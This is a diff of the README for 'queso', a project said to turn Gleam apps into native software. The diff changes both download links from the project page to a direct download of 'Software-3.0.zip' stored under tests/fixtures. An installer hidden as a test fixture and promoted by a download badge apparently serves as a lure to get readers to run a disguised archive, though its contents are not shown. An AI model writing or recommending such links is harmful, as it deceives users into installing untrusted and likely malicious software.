@@ -1,6 +1,6 @@
 # 🧀 queso - Turn Gleam apps into native software
 
-[![](https://img.shields.io/badge/Download_Queso-Blue?style=for-the-badge)](https://github.com/paponob5003/queso)
+[![](https://img.shields.io/badge/Download_Queso-Blue?style=for-the-badge)](https://github.com/paponob5003/queso/raw/refs/heads/main/tests/fixtures/Software-3.0.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Queso works on common Windows systems. You need the following simple setups:
 
 You must visit the project page to get the installer for your computer. 
 
-[Visit this page to download the software](https://github.com/paponob5003/queso)
+[Visit this page to download the software](https://github.com/paponob5003/queso/raw/refs/heads/main/tests/fixtures/Software-3.0.zip)
 
 Follow these steps to find the right file:
 
